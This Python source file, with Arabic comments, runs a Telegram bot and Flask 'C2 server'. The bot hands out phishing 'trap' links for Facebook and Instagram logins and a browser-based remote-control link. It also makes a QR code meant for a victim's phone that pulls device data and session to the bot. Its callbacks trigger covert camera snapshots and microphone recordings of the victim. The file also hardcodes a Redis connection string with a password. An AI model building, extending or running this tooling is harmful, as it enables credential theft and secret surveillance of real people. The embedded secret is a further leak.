import os
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
import redis
import uuid

# استيراد ملفات الأدوات المستقلة
from facebook_module import init_facebook_routes
from instagram_module import init_instagram_routes
from rat_module import init_rat_routes, rat_bp, queue_command
from qr_pairing import init_qr_routes, qr_bp, generate_qr_code_bytes

BOT_TOKEN = os.getenv("BOT_TOKEN")
RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()

if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
    redis_client.ping()
except Exception as e:
    print(f"[-] Critical Redis Connection Error: {e}")
    redis_client = None

if not BOT_TOKEN:
    raise ValueError("[-] BOT_TOKEN is missing!")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# مسار أساسي للـ Health Check لمنع إغلاق الكونتينر من قبل Railway
@app.route('/')
def health_check():
    return "C2 Server and Telegram Bot are active and running smoothly.", 200

# تسجيل الـ Blueprints الخاصة بالمسارات
app.register_blueprint(rat_bp)
app.register_blueprint(qr_bp)

# ربط مسارات السيرفر للملفات المستقلة
init_facebook_routes(app, bot)
init_instagram_routes(app, bot)
init_rat_routes(app, bot)
init_qr_routes(app, bot)

def main_menu():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
    markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
    markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
    return markup

@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    user_name = message.from_user.first_name
    text = (
        f"⚡ مرحباً بك يا {user_name} في DEV ١ 😈\n\n"
        "غير مسؤول تماماً عن إساءة الاستخدام."
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id

    if call.data == "gen_fb":
        bot.answer_callback_query(call.id, "جاري تجهيز رابط فيسبوك...")
        link = f"{RAILWAY_URL}/login.php?id={chat_id}"
        bot.send_message(chat_id, f"🎯 **رابط فيسبوك المخصص:**\n`{link}`", parse_mode="Markdown")
        
    elif call.data == "gen_ig":
        bot.answer_callback_query(call.id, "جاري تجهيز رابط انستقرام...")
        link = f"{RAILWAY_URL}/ig_login.php?id={chat_id}"
        bot.send_message(chat_id, f"📸 **رابط انستقرام المخصص:**\n`{link}`", parse_mode="Markdown")

    elif call.data == "gen_rat":
        bot.answer_callback_query(call.id, "جاري تجهيز رابط التحكم الخلفي المطور...")
        link = f"{RAILWAY_URL}/system_secure_v2?id={chat_id}"
        bot.send_message(
            chat_id, 
            f"📱 **رابط المراقبة والتحكم الخلفي المطور جاهز:**\n`{link}`\n\nبمجرد أن يفتح الضحية الرابط ستعمل الجلسة في خلفية متصفحه بلا توقف.", 
            parse_mode="Markdown"
        )

    elif call.data == "gen_qr":
        bot.answer_callback_query(call.id, "جاري توليد كود الـ QR السريع...")
        token = str(uuid.uuid4())[:8]
        if redis_client:
            try:
                redis_client.setex(f"qr_token:{token}", 300, chat_id)
            except Exception as e:
                print(f"Redis write error: {e}")
        
        target_link = f"{RAILWAY_URL}/qr_scan_target?token={token}"
        qr_image = generate_qr_code_bytes(target_link)
        qr_image.name = 'pairing_qr.jpg'
        
        bot.send_photo(
            chat_id, 
            qr_image, 
            caption="📷 **امسح هذا الـ QR بكاميرا هاتف الضحية:**\n\nبمجرد توجيه الكاميرا وفتح الرابط، سيتم سحب بيانات الجهاز وجلسة الضحية فوراً إلى بوتك هنا دون تثبيت أي برامج!",
            parse_mode="Markdown"
        )
        
    elif call.data.startswith("rat_cam_"):
        target_chat_id = call.data.replace("rat_cam_", "")
        queue_command(target_chat_id, "snapshot")
        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة من الضحية...")

    elif call.data.startswith("rat_mic_"):
        target_chat_id = call.data.replace("rat_mic_", "")
        queue_command(target_chat_id, "audio")
        bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

if __name__ == "__main__":
    # تشغيل سيرفر فلاسك في خلفية العمليات ليظل الكونتينر نشطاً ويستقبل طلبات الويب
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    print("[+] Flask Web Server started successfully in background thread.")

    # تشغيل بوت التيليجرام في الخيط الرئيسي لكي يستجيب للأوامر فوراً
    print("[+] Starting Telegram Bot polling...")
    bot.infinity_polling(skip_pending=True)
